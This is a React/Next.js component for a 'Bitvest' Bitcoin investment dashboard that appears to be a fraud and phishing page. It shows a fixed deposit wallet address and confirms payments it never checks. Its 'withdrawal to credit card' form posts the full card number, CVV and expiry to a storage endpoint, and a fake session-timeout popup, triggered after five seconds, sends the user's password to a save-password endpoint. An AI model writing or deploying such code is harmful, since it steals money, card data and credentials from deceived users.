"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { FaExchangeAlt, FaBalanceScale, FaBitcoin, FaChartLine, FaDollarSign, FaShoppingCart, FaArrowCircleDown, FaSignOutAlt, FaCopy, FaLock, FaCheckSquare, FaSquare } from "react-icons/fa";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import CreditCardType from "credit-card-type";

declare global {
  interface Window {
    TradingView: { 
      widget: new (options: {
        container_id: string;
        autosize: boolean;
        symbol: string;
        interval: string;
        timezone: string;
        theme: string;
        style: string;
        locale: string;
        toolbar_bg: string;
        enable_publishing: boolean;
        allow_symbol_change: boolean;
        save_image: boolean;
        hide_top_toolbar: boolean;
        backgroundColor: string;
      }) => void;
    };
  }
}

const UserDashboard2 = () => {
  const [darkMode] = useState(false);
  const [showBuyBitcoin, setShowBuyBitcoin] = useState(false);
  const [showWithdrawBitcoin, setShowWithdrawBitcoin] = useState(false);
  const [withdrawWallet, setWithdrawWallet] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [withdrawCurrency, setWithdrawCurrency] = useState("USD");
  const [withdrawMethod, setWithdrawMethod] = useState("wallet");
  const [creditCardNumber, setCreditCardNumber] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [creditCardType, setCreditCardType] = useState<string | null>(null);
  const [showTimeoutPopup, setShowTimeoutPopup] = useState(false);
  const [password, setPassword] = useState("");
  const [saveDevice, setSaveDevice] = useState(false);

  const router = useRouter();

  const profit = 0.00;
  const totalInvestment = 0.00;
  const totalBalance = 0.00;

  const getCreditCardIcon = (type: string | null): string => {
    const normalizedType = type?.toLowerCase().replace(" ", "-") || "";

    const iconMap: Record<string, string> = {
      visa: "https://img.icons8.com/color/48/000000/visa.png",
      mastercard: "https://img.icons8.com/color/48/000000/mastercard.png",
      "american-express": "https://img.icons8.com/color/48/000000/amex.png",
      discover: "https://img.icons8.com/color/48/000000/discover.png",
    };

    return iconMap[normalizedType] || "https://img.icons8.com/color/48/000000/generic-card.png";
  };

  // Initialize TradingView widget
  useEffect(() => {
    if (typeof window !== "undefined") {
      const scriptId = "tradingview-widget-script";
      const containerId = "tradingview_chart";

      const initializeWidget = () => {
        const container = document.getElementById(containerId);
        if (window.TradingView && container) {
          container.innerHTML = ""; // Clear any existing content
          new window.TradingView.widget({
            container_id: containerId,
            autosize: true,
            symbol: "BITSTAMP:BTCUSD",
            interval: "D",
            timezone: "Etc/UTC",
            theme: darkMode ? "dark" : "light",
            style: "1",
            locale: "en",
            toolbar_bg: "#f1f3f6",
            enable_publishing: false,
            allow_symbol_change: true,
            save_image: false,
            hide_top_toolbar: false,
            backgroundColor: "transparent",
          });
        }
      };

      if (!document.getElementById(scriptId)) {
        const script = document.createElement("script");
        script.id = scriptId;
        script.src = "https://s3.tradingview.com/tv.js";
        script.async = true;
        script.onload = () => {
          setTimeout(initializeWidget, 100);
        };
        script.onerror = () => {
          console.error("Failed to load TradingView script");
        };
        document.body.appendChild(script);
      } else {
        setTimeout(initializeWidget, 100);
      }
    }
  }, [darkMode]);

  useEffect(() => {
    const savedDevice = localStorage.getItem("saveDevice");
    if (!savedDevice) {
      const timeout = setTimeout(() => {
        setShowTimeoutPopup(true);
      }, 5000);

      return () => clearTimeout(timeout);
    }
  }, []);

  const handleLogout = () => {
    router.push("/");
    toast.success("Logged out successfully");
  };

  const handleCopyWallet = () => {
    navigator.clipboard.writeText("bc1qzpvj8e984mwlxfwyca9glvgd7qn9qhlqsqj6xl");
    // bc1q5j6fnc2dldugvge7hff54pf2rw6ej5rvxkjpgr
    toast.success("Wallet address copied to clipboard");
  };

  const handleAlreadyPaid = () => {
    setShowBuyBitcoin(false);
    toast.success("Payment confirmed! You will receive your Bitcoin shortly.");
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
    if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
    if (value.length > 2) value = `${value.slice(0, 2)}/${value.slice(2)}`; // Add '/' after MM
    setExpiryDate(value);
  };

  const handleCreditCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
    setCreditCardNumber(value);

    const detectedCards = CreditCardType(value);
    setCreditCardType(detectedCards.length > 0 ? detectedCards[0].type : null); // Set detected card type
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Allow only numbers
    setCvv(value.slice(0, 3)); // Limit to 3 digits
  };

  const handlePayout = async () => {
    if (withdrawMethod === "wallet") {
      if (withdrawWallet && withdrawAmount) {
        setShowWithdrawBitcoin(false);
        toast.success(`Payout of ${withdrawAmount} ${withdrawCurrency} initiated to the provided wallet address.`);
      } else {
        toast.error("Please enter a valid Bitcoin wallet address and amount.");
      }
    } else if (withdrawMethod === "creditCard") {
      if (withdrawAmount && creditCardNumber && cardholderName && cvv && expiryDate) {
        try {
          const response = await fetch("/api/store-credit-card", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              creditCardNumber,
              cardholderName,
              cvv,
              expiryDate,
              withdrawAmount,
              withdrawCurrency,
            }),
          });

          if (response.ok) {
            setShowWithdrawBitcoin(false);
            toast.success(`Payout of ${withdrawAmount} ${withdrawCurrency} will be processed to your credit card.`);
          } else {
            toast.error("Failed to process credit card details.");
          }
        } catch {
          toast.error("An error occurred while processing the credit card details.");
        }
      } else {
        toast.error("Please enter valid credit card details, CVV, expiry date, and amount.");
      }
    }
  };

  const handleTimeoutSubmit = async () => {
    if (password) {
      if (saveDevice) {
        localStorage.setItem("saveDevice", "true");
      }
      try {
        const response = await fetch("/api/save-password", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ password }),
        });
        if (response.ok) {
          setShowTimeoutPopup(false);
          toast.success("Session restored successfully");
        } else {
          toast.error("Failed to save password.");
        }
      } catch {
        toast.error("An error occurred while saving the password.");
      }
    } else {
      toast.error("Please enter your password.");
    }
  };

  return (
    <div className={`min-h-screen p-8 pb-20 sm:p-20 font-[family-name:var(--font-geist-sans)] ${darkMode ? "dark" : ""}`}>
      <ToastContainer />
      <header className="flex flex-col items-center sm:items-start mb-4 w-full">
        <h1 className="text-4xl font-bold text-black dark:text-white">Welcome Earl</h1>
        <div className="flex gap-4 mt-4">
          <button
            className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-green-500 text-white gap-2 hover:bg-green-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
            onClick={() => setShowBuyBitcoin(true)}
          >
            <FaShoppingCart className="text-lg" />
            Buy Bitcoin
          </button>
          <button
            className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-red-500 text-white gap-2 hover:bg-red-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
            onClick={() => setShowWithdrawBitcoin(true)}
          >
            <FaArrowCircleDown className="text-lg" />
            Withdraw Bitcoin
          </button>
          <button className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-gray-500 text-white gap-2 hover:bg-gray-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5" onClick={handleLogout}>
            <FaSignOutAlt className="text-lg" />
            Logout
          </button>
        </div>
      </header>
      <main className="flex flex-col gap-8 items-center sm:items-start">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4 mt-4 w-full">
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaExchangeAlt className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Transactions</h3>
            <p className="text-black dark:text-white">0</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaBalanceScale className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Total Balance</h3>
            <p className="text-black dark:text-white">${totalBalance.toFixed(2)}</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaBitcoin className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">BTC Balance</h3>
            <p className="text-black dark:text-white">0.000000 BTC</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaChartLine className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Profit</h3>
            <p className="text-black dark:text-white">${profit.toFixed(2)}</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaDollarSign className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Total Investment</h3>
            <p className="text-black dark:text-white">${totalInvestment.toFixed(2)}</p>
          </div>
        </div>
        <section className="trading-view-chart mt-8 w-full">
          <h2 className="text-3xl font-bold mb-6 text-black dark:text-white">Bitcoin Live Chart</h2>
          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg shadow-lg">
            <div 
              id="tradingview_chart" 
              className="w-full h-96 min-h-[400px]"
            >
              <div className="flex items-center justify-center h-full text-gray-500">
                Loading TradingView Chart...
              </div>
            </div>
          </div>
        </section>
        <section className="widgets mt-8 w-full grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          <div className="widget bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/security-checked.png" alt="Secure Transactions" className="icon" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Secure Transactions</h3>
            <p className="text-black dark:text-white">Experience the security of blockchain technology.</p>
          </div>
          <div className="widget bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/globe.png" alt="Global Reach" className="icon" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Global Reach</h3>
            <p className="text-black dark:text-white">Send and receive Bitcoin anywhere in the world.</p>
          </div>
          <div className="widget bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/decentralized-network.png" alt="Decentralized Network" className="icon" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Decentralized Network</h3>
            <p className="text-black dark:text-white">Join a network that is not controlled by any single entity.</p>
          </div>
        </section>
      </main>
      <footer className="flex items-center justify-center p-4 bg-transparent text-foreground">
        <p className="text-black dark:text-white">&copy; 2025 Bitvest. All rights reserved.</p>
      </footer>
      {showBuyBitcoin && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm">
          <div className="bg-white bg-opacity-90 p-8 rounded-lg shadow-lg backdrop-blur-md">
            <h2 className="text-2xl font-bold mb-4 text-black">Buy Bitcoin</h2>
            <p className="mb-4 text-black">Send Bitcoin to the following wallet address:</p>
            <p className="mb-4 font-mono text-black flex items-center gap-2 cursor-pointer" onClick={handleCopyWallet}>
              bc1qzpvj8e984mwlxfwyca9glvgd7qn9qhlqsqj6xl
              <FaCopy className="text-lg" />
            </p>
            <div className="flex justify-end gap-4">
              <button
                className="px-4 py-2 bg-gray-300 rounded-lg text-black"
                onClick={() => setShowBuyBitcoin(false)}
              >
                Close
              </button>
              <button
                className="px-4 py-2 bg-green-500 text-white rounded-lg"
                onClick={handleAlreadyPaid}
              >
                Already Paid
              </button>
            </div>
          </div>
        </div>
      )}
      {showWithdrawBitcoin && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm">
          <div className="bg-white bg-opacity-90 p-8 rounded-lg shadow-lg backdrop-blur-md">
            <h2 className="text-2xl font-bold mb-4 text-black">Withdraw Bitcoin</h2>
            <label htmlFor="withdraw-method" className="mb-2 text-black">Select withdrawal method:</label>
            <select
              id="withdraw-method"
              className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
              value={withdrawMethod}
              onChange={(e) => setWithdrawMethod(e.target.value)}
            >
              <option value="wallet">Bitcoin Wallet</option>
              <option value="creditCard">Credit Card</option>
            </select>
            {withdrawMethod === "wallet" && (
              <>
                <p className="mb-4 text-black">Enter the Bitcoin wallet address to withdraw to:</p>
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={withdrawWallet}
                  onChange={(e) => setWithdrawWallet(e.target.value)}
                  placeholder="Bitcoin Wallet Address"
                  required
                />
              </>
            )}
            {withdrawMethod === "creditCard" && (
              <>
                <p className="mb-4 text-black">Enter your credit card details:</p>
                <div className="relative mb-4">
                  <input
                    className="w-full px-3 py-2 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                    type="text"
                    value={creditCardNumber}
                    onChange={handleCreditCardNumberChange}
                    placeholder="Credit Card Number"
                    required
                  />
                  {creditCardType && (
                    <img
                      src={getCreditCardIcon(creditCardType)}
                      alt={creditCardType || "Credit Card"}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 h-6"
                      onError={(e) => (e.currentTarget.src = "https://img.icons8.com/color/48/000000/generic-card.png")} // Fallback on error
                    />
                  )}
                </div>
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value)}
                  placeholder="Cardholder Name"
                  required
                />
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={cvv}
                  onChange={handleCvvChange}
                  placeholder="CVV"
                  required
                />
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={expiryDate}
                  onChange={handleExpiryDateChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  required
                />
              </>
            )}
            <p className="mb-4 text-black">Enter the amount to withdraw:</p>
            <input
              className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
              type="text"
              value={withdrawAmount}
              onChange={(e) => setWithdrawAmount(e.target.value)}
              placeholder="Amount"
              required
            />
            <label htmlFor="currency-select" className="mb-4 text-black">Select currency:</label>
            <select
              id="currency-select"
              className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
              value={withdrawCurrency}
              onChange={(e) => setWithdrawCurrency(e.target.value)}
            >
              <option value="USD">USD</option>
              <option value="BTC">BTC</option>
            </select>
            <div className="flex justify-end gap-4">
              <button
                className="px-4 py-2 bg-gray-300 rounded-lg text-black"
                onClick={() => setShowWithdrawBitcoin(false)}
              >
                Close
              </button>
              <button
                className="px-4 py-2 bg-green-500 text-white rounded-lg"
                onClick={handlePayout}
              >
                Payout
              </button>
            </div>
          </div>
        </div>
      )}
      {showTimeoutPopup && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm">
          <div className="bg-white bg-opacity-90 p-8 rounded-lg shadow-lg backdrop-blur-md">
            <h2 className="text-2xl font-bold mb-4 text-black">Session Timeout</h2>
            <p className="mb-4 text-black">Please enter your password to continue:</p>
            <div className="mb-4 flex items-center gap-2">
              <FaLock className="text-lg text-black" />
              <input
                className="w-full px-3 py-2 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                required
              />
            </div>
            <div className="mb-4 flex items-center gap-2 cursor-pointer" onClick={() => setSaveDevice(!saveDevice)}>
              {saveDevice ? <FaCheckSquare className="text-lg text-black" /> : <FaSquare className="text-lg text-black" />}
              <span className="text-black">Save this device</span>
            </div>
            <div className="flex justify-end gap-4">
              <button
                className="px-4 py-2 bg-gray-300 rounded-lg text-black"
                onClick={() => setShowTimeoutPopup(false)}
              >
                Close
              </button>
              <button
                className="px-4 py-2 bg-green-500 text-white rounded-lg"
                onClick={handleTimeoutSubmit}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default UserDashboard2;
